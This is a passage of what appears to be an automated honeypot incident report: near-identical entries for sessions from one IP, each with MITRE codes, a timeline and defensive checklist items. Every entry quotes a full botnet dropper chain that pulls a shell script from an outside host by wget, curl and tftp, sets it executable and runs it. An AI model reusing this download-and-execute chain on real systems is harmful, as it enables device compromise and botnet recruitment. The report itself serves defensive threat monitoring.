| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:36` | `cowrie.session.connect` |
| `2026-08-25 09:59:36` | `cowrie.login.success` |
| `2026-08-25 09:59:37` | `cowrie.session.params` |
| `2026-08-25 09:59:37` | `cowrie.command.input` |
| `2026-08-25 09:59:37` | `cowrie.command.success` |
| `2026-08-25 09:59:37` | `cowrie.log.closed` |
| `2026-08-25 09:59:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e62eadcfbf84

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:37` | `cowrie.session.connect` |
| `2026-08-25 09:59:38` | `cowrie.login.success` |
| `2026-08-25 09:59:38` | `cowrie.session.params` |
| `2026-08-25 09:59:38` | `cowrie.command.input` |
| `2026-08-25 09:59:38` | `cowrie.command.success` |
| `2026-08-25 09:59:39` | `cowrie.log.closed` |
| `2026-08-25 09:59:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-628cb7186b9e

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:39` | `cowrie.session.connect` |
| `2026-08-25 09:59:39` | `cowrie.login.success` |
| `2026-08-25 09:59:40` | `cowrie.session.params` |
| `2026-08-25 09:59:40` | `cowrie.command.input` |
| `2026-08-25 09:59:40` | `cowrie.command.success` |
| `2026-08-25 09:59:40` | `cowrie.log.closed` |
| `2026-08-25 09:59:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-161475d0b37e

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:40` | `cowrie.session.connect` |
| `2026-08-25 09:59:41` | `cowrie.login.success` |
| `2026-08-25 09:59:41` | `cowrie.session.params` |
| `2026-08-25 09:59:41` | `cowrie.command.input` |
| `2026-08-25 09:59:41` | `cowrie.command.success` |
| `2026-08-25 09:59:42` | `cowrie.log.closed` |
| `2026-08-25 09:59:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e2a54b79d22

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:42` | `cowrie.session.connect` |
| `2026-08-25 09:59:42` | `cowrie.login.success` |
| `2026-08-25 09:59:43` | `cowrie.session.params` |
| `2026-08-25 09:59:43` | `cowrie.command.input` |
| `2026-08-25 09:59:43` | `cowrie.command.success` |
| `2026-08-25 09:59:43` | `cowrie.log.closed` |
| `2026-08-25 09:59:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25ab8a3a3a4b

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:43` | `cowrie.session.connect` |
| `2026-08-25 09:59:44` | `cowrie.login.success` |
| `2026-08-25 09:59:44` | `cowrie.session.params` |
| `2026-08-25 09:59:44` | `cowrie.command.input` |
| `2026-08-25 09:59:44` | `cowrie.command.success` |
| `2026-08-25 09:59:45` | `cowrie.log.closed` |
| `2026-08-25 09:59:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9e3db3e0ef9

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:45` | `cowrie.session.connect` |
| `2026-08-25 09:59:45` | `cowrie.login.success` |
| `2026-08-25 09:59:46` | `cowrie.session.params` |
| `2026-08-25 09:59:46` | `cowrie.command.input` |
| `2026-08-25 09:59:46` | `cowrie.command.success` |
| `2026-08-25 09:59:46` | `cowrie.log.closed` |
| `2026-08-25 09:59:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c390433c02a3

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:46` | `cowrie.session.connect` |
| `2026-08-25 09:59:47` | `cowrie.login.success` |
| `2026-08-25 09:59:47` | `cowrie.session.params` |
| `2026-08-25 09:59:47` | `cowrie.command.input` |
| `2026-08-25 09:59:47` | `cowrie.command.success` |
| `2026-08-25 09:59:48` | `cowrie.log.closed` |
| `2026-08-25 09:59:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfd812edccf6

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:48` | `cowrie.session.connect` |
| `2026-08-25 09:59:48` | `cowrie.login.success` |
| `2026-08-25 09:59:49` | `cowrie.session.params` |
| `2026-08-25 09:59:49` | `cowrie.command.input` |
| `2026-08-25 09:59:49` | `cowrie.session.file_download` |
| `2026-08-25 09:59:49` | `cowrie.session.file_download` |
| `2026-08-25 09:59:49` | `cowrie.session.file_download` |
| `2026-08-25 09:59:49` | `cowrie.log.closed` |
| `2026-08-25 09:59:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb47b74594be

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:49` | `cowrie.session.connect` |
| `2026-08-25 09:59:50` | `cowrie.login.success` |
| `2026-08-25 09:59:50` | `cowrie.session.params` |
| `2026-08-25 09:59:50` | `cowrie.command.input` |
| `2026-08-25 09:59:50` | `cowrie.session.file_download` |
| `2026-08-25 09:59:50` | `cowrie.session.file_download` |
| `2026-08-25 09:59:51` | `cowrie.session.file_download` |
| `2026-08-25 09:59:51` | `cowrie.log.closed` |
| `2026-08-25 09:59:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e71e99ce11eb

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:51` | `cowrie.session.connect` |
| `2026-08-25 09:59:51` | `cowrie.login.success` |
| `2026-08-25 09:59:52` | `cowrie.session.params` |
| `2026-08-25 09:59:52` | `cowrie.command.input` |
| `2026-08-25 09:59:52` | `cowrie.session.file_download` |
| `2026-08-25 09:59:52` | `cowrie.session.file_download` |
| `2026-08-25 09:59:52` | `cowrie.log.closed` |
| `2026-08-25 09:59:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20912914dc20

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:52` | `cowrie.session.connect` |
| `2026-08-25 09:59:53` | `cowrie.login.success` |
| `2026-08-25 09:59:53` | `cowrie.session.params` |
| `2026-08-25 09:59:53` | `cowrie.command.input` |
| `2026-08-25 09:59:53` | `cowrie.command.success` |
| `2026-08-25 09:59:54` | `cowrie.log.closed` |
| `2026-08-25 09:59:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20f445770bf0

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:54` | `cowrie.session.connect` |
| `2026-08-25 09:59:54` | `cowrie.login.success` |
| `2026-08-25 09:59:55` | `cowrie.session.params` |
| `2026-08-25 09:59:55` | `cowrie.command.input` |
| `2026-08-25 09:59:55` | `cowrie.command.success` |
| `2026-08-25 09:59:55` | `cowrie.session.file_download` |
| `2026-08-25 09:59:55` | `cowrie.log.closed` |
| `2026-08-25 09:59:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0d2628c4cac

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:55` | `cowrie.session.connect` |
| `2026-08-25 09:59:56` | `cowrie.login.success` |
| `2026-08-25 09:59:56` | `cowrie.session.params` |
| `2026-08-25 09:59:56` | `cowrie.command.input` |
| `2026-08-25 09:59:56` | `cowrie.command.success` |
| `2026-08-25 09:59:56` | `cowrie.session.file_download` |
| `2026-08-25 09:59:57` | `cowrie.log.closed` |
| `2026-08-25 09:59:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffa1db4bcf77

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:57` | `cowrie.session.connect` |
| `2026-08-25 09:59:57` | `cowrie.login.success` |
| `2026-08-25 09:59:58` | `cowrie.session.params` |
| `2026-08-25 09:59:58` | `cowrie.command.input` |
| `2026-08-25 09:59:58` | `cowrie.command.success` |
| `2026-08-25 09:59:58` | `cowrie.log.closed` |
| `2026-08-25 09:59:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e9f2b76ca34

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:59 |
| **Last Seen** | 2026-08-25 10:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:59:58` | `cowrie.session.connect` |
| `2026-08-25 09:59:59` | `cowrie.login.success` |
| `2026-08-25 09:59:59` | `cowrie.session.params` |
| `2026-08-25 09:59:59` | `cowrie.command.input` |
| `2026-08-25 09:59:59` | `cowrie.command.success` |
| `2026-08-25 10:00:00` | `cowrie.log.closed` |
| `2026-08-25 10:00:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b7697467542

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 10:00 |
| **Last Seen** | 2026-08-25 10:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 10:00:00` | `cowrie.session.connect` |
| `2026-08-25 10:00:00` | `cowrie.login.success` |
| `2026-08-25 10:00:01` | `cowrie.session.params` |
| `2026-08-25 10:00:01` | `cowrie.command.input` |
| `2026-08-25 10:00:01` | `cowrie.command.success` |
